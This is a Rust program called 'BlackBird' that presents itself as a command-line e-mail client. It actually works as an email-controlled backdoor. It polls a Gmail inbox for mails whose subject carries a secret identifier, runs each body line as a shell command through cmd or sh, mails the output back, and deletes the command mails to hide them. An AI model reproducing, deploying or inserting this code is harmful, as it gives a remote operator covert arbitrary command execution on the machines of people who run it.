// Import necessary crates and modules
use clap::{App, Arg}; // Command-line argument parsing
use imap::Session; // IMAP session for connecting and interacting with e-mail
use native_tls::TlsStream; // TLS stream for secure communication
use std::net::TcpStream; // Standard TCP connection
use std::error::Error; // Error handling
use tokio::runtime::Runtime; // Tokio runtime for asynchronous execution
use tokio::time::{sleep, Duration}; // Asynchronous sleep for intervals
use tokio::process::Command; // Running system commands asynchronously
use lettre::{Message, Transport, SmtpTransport}; // Sending e-mails via SMTP
use lettre::transport::smtp::authentication::Credentials; // SMTP credentials

// Function to check e-mail for commands
async fn check_mail(username: &str, password: &str, string_identifier: &str) -> Result<(), Box<dyn Error>> {

    let domain = "imap.gmail.com"; // *** ||| Change the domain if you're using your own IMAP server ||| ***
    let tls = native_tls::TlsConnector::new()?; // Initialize TLS for secure communication
    let client = imap::connect((domain, 993), domain, &tls)?; // *** ||| Change the port if you're using your own IMAP server on a different port ||| ***

    // Login to the IMAP server with provided credentials
    let mut session: Session<TlsStream<TcpStream>> = client.login(username, password).map_err(|e| e.0)?;
    session.select("INBOX")?; // Select the INBOX folder to search for unread messages
    let messages = session.search("UNSEEN")?; // Search for unseen (unread) messages

    // Collect message IDs into a vector
    let mut message_ids: Vec<u32> = messages.iter().map(|&id| id).collect();
    
    // Sort message IDs in ascending order (oldest first)
    message_ids.sort();

    // Iterate through each e-mail message ID
    for message_id in message_ids {
        let message = session.fetch(message_id.to_string(), "(BODY[] ENVELOPE)")?; // Fetch the message by ID
        for fetched in message.iter() {
            let envelope = match fetched.envelope() {
                Some(env) => env, // Extract the e-mail envelope information (sender, subject, etc.)
                None => {
                    println!("No envelope found for message ID {}", message_id);
                    continue;
                }
            };

            // Extract subject, date, sender address, and recipient address from the e-mail envelope

            let subject_str = envelope.subject
                .as_ref()
                .map(|s| String::from_utf8_lossy(s).to_string())
                .unwrap_or_else(|| "No Subject".to_string());

            let date_str = envelope.date
                .as_ref()
                .map(|d| String::from_utf8_lossy(d).to_string())
                .unwrap_or_else(|| "No Date".to_string());

            let from_addr = envelope.from
                .as_ref()
                .and_then(|f| f.first())
                .and_then(|addr| {
                    Some(format!(
                        "{}@{}",
                        String::from_utf8_lossy(addr.mailbox?),
                        String::from_utf8_lossy(addr.host?)
                    ))
                })
                .unwrap_or_else(|| "Unknown".to_string());

            let to_addr = envelope.to
                .as_ref()
                .and_then(|t| t.first())
                .and_then(|addr| {
                    Some(format!(
                        "{}@{}",
                        String::from_utf8_lossy(addr.mailbox?),
                        String::from_utf8_lossy(addr.host?)
                    ))
                })
                .unwrap_or_else(|| "Unknown".to_string());

            // If the subject matches the specified string identifier inside of "Command ()", process it

            if subject_str.eq_ignore_ascii_case(&format!("Command ({})", string_identifier)) {
                if let Some(body) = fetched.body() { // If the e-mail has a body, extract the text
                    let body_text = extract_plain_text(body);

                    session.store(message_id.to_string(), "+FLAGS (\\Seen)")?; // Mark the e-mail as read
                    session.store(message_id.to_string(), "+FLAGS (\\Deleted)")?; // Mark the e-mail for deletion
                    session.expunge()?; // Remove the e-mail from the inbox

                    // Execute the commands found in the e-mail body
                    let reply_body = execute_commands(&body_text, &to_addr, &from_addr, &subject_str, &date_str).await;

                    // Send a reply to the original e-mail sender
                    if let Some(from) = &envelope.from {
                        if let Some(first_address) = from.first() {
                            if let (Some(mailbox), Some(host)) = (first_address.mailbox, first_address.host) {
                                let reply_to_email = format!("{}@{}", String::from_utf8_lossy(mailbox), String::from_utf8_lossy(host));
                                send_reply(&reply_body, username, password, &reply_to_email, &subject_str)?;
                            } else {
                                println!("Incomplete address for message ID {}", message_id);
                            }
                        }
                    }
                }
            } else if subject_str.to_ascii_lowercase().starts_with("command (") || subject_str.to_ascii_lowercase().starts_with("re: command (") {
                session.store(message_id.to_string(), "-FLAGS (\\Seen)")?; // Mark the e-mail as unread explicitly
            } else {
                // For other messages, display their content
                if let Some(body) = fetched.body() {
                    let body_text = extract_plain_text(body);
                    if let Some(from) = &envelope.from {
                        if let Some(first_address) = from.first() {
                            if let (Some(mailbox), Some(host)) = (first_address.mailbox, first_address.host) {
                                let reply_to_email = format!("{}@{}", String::from_utf8_lossy(mailbox), String::from_utf8_lossy(host));
                                println!("From:    {}", reply_to_email);
                                println!("To:      {}", to_addr);
                                println!("Date:    {}", date_str);
                                println!("Subject: {}", subject_str);
                                println!("__________________________________________\n");
                                println!("{}\n", body_text);
                                println!("===================================================\n\n\n");

                                session.store(message_id.to_string(), "+FLAGS (\\Seen)")?; // Mark the e-mail as read
                                session.store(message_id.to_string(), "+FLAGS (\\Deleted)")?; // Mark the e-mail for deletion
                                session.expunge()?; // Remove the e-mail from the inbox
                            } else {
                                println!("Incomplete address for message ID {}", message_id);
                            }
                        }
                    }
                }
            }
        }
    }

    session.logout()?; // Logout from the IMAP server after processing
    Ok(())
}

// Function to extract plain text from e-mail body
fn extract_plain_text(body: &[u8]) -> String {
    let body_str = String::from_utf8_lossy(body);
    let parts: Vec<&str> = body_str.split("--").collect();

    for part in parts {
        if part.contains("Content-Type: text/plain") {
            let split: Vec<&str> = part.split("\r\n\r\n").collect();
            if split.len() > 1 {
                return split[1].to_string();
            }
        }
    }

    body_str.to_string()
}

// Function to execute commands found in the e-mail body and prepare a reply
use std::env::consts::OS;
async fn execute_commands(body: &str, from: &str, to: &str, subject: &str, date: &str) -> String {
    let mut reply_body = String::new();

    // Iterate through each line in the e-mail body, considering a blank line the end of the command list
    for line in body.lines() {
        let command = line.trim();
        if !command.is_empty() {
            // Determine the correct shell to use based on the operating system
            let output = if OS == "windows" {
                Command::new("cmd")
                    .arg("/C")
                    .arg(command)
                    .output()
                    .await
            } else {
                Command::new("sh")
                    .arg("-c")
                    .arg(command)
                    .output()
                    .await
            };

            let command_output = match output {
                Ok(output) => {
                    let stdout = String::from_utf8_lossy(&output.stdout);
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    format!("{}\n{}\n", stdout.trim(), stderr.trim())
                }
                Err(e) => format!("Failed to execute command: {}. Error: {}", command, e),
            };

            // Append the command output to the reply body
            reply_body.push_str("Command Sent:\n");
            reply_body.push_str(&format!("{}\n", command));
            reply_body.push_str("__________________________________________\n\n");
            reply_body.push_str("Command Response:\n");
            reply_body.push_str("__________________________________________\n\n");
            reply_body.push_str(&command_output);
            reply_body.push_str("===================================================\n\n\n");
        }
    }

    // Append the original e-mail header information to the reply
    reply_body.push_str("************* ORIGINAL MESSAGE BELOW: *************\n\n\n");
    reply_body.push_str("===================================================\n\n\n");
    reply_body.push_str(&format!("From:      {}", from));
    reply_body.push_str(&format!("\nTo:      {}", to));
    reply_body.push_str(&format!("\nDate:    {}", date));
    reply_body.push_str(&format!("\nSubject: {}", subject));
    reply_body.push_str("\n---------------------------------------------------\n\n");
    reply_body.push_str(&format!("{}", body));

    reply_body
}

// Function to send the reply e-mail
fn send_reply(reply_body: &str, username: &str, password: &str, original_from: &str, original_subject: &str) -> Result<(), Box<dyn Error>> {
    let email = Message::builder()
        .from(format!("{} <{}>", username, username).parse()?)
        .to(original_from.parse()?)
        .subject(format!("Re: {}", original_subject))
        .body(reply_body.to_string())?;

    // Establishes SMTP connection with credentials for authentication
    let creds = Credentials::new(username.to_string(), password.to_string());
    let mailer = SmtpTransport::starttls_relay("smtp.gmail.com")? // *** ||| Change if you're using a custom mail server ||| ***
        .credentials(creds)
        .port(587) // *** ||| Change port if you're using your own server with a different port ||| ***
        .build();

    // Send the e-mail
    mailer.send(&email)?;

    Ok(())
}

fn main() {
//  *** ||| Comment from here...
//
    let matches = App::new("BlackBird")
        .version("1.6.3")
        .author("Winter Softworks")
        .about("Command line e-mail client")
        .arg(Arg::new("username")
            .short('u')
            .long("username")
            .takes_value(true)
            .required(true)
            .help("E-mail username"))
        .arg(Arg::new("password")
            .short('p')
            .long("password")
            .takes_value(true)
            .required(true)
            .help("E-mail password"))
        .arg(Arg::new("time")
            .short('t')
            .long("time")
            .takes_value(true)
            .required(true)
            .help("Time interval to check email (in minutes)"))
        .arg(Arg::new("string")
            .short('s')
            .long("string")
            .takes_value(true)
            .required(true)
            .help("String identifier to check e-mail (not case sensitive)"))
        .get_matches();

    let username = matches.value_of("username").unwrap();
    let password = matches.value_of("password").unwrap();
    let string_identifier = matches.value_of("string").unwrap();
    let interval: u64 = matches.value_of("time").unwrap().parse().unwrap();

//
//  ...to here if you want to hard code settings ||| ***

//  *** ||| Uncomment from here...
//
//    let username = "your_email@gmail.com"; // Replace with your gmail address
//    let password = "your_password"; // Replace with your app password
//    let string_identifier = "x675-1983zzy"; // Replace with the desired string identifier
//    let interval: u64 = 15; // Time interval in minutes (replace with your desired interval)
//
//  ...to here if you want to hard code settings ||| ***

    // Initialize the runtime for asynchronous execution
    let rt = Runtime::new().unwrap();
    rt.block_on(async move {
        loop {
            let username = username.to_string();
            let password = password.to_string();
            let string_identifier = string_identifier.to_string();

            // Spawn a detached task
            tokio::spawn(async move {
                if let Err(e) = check_mail(&username, &password, &string_identifier).await {
                    eprintln!("Error: {}", e);
                }
            });

            // Wait for the specified interval before checking e-mail again
            sleep(Duration::from_secs(interval * 60)).await;
        }
    });
}
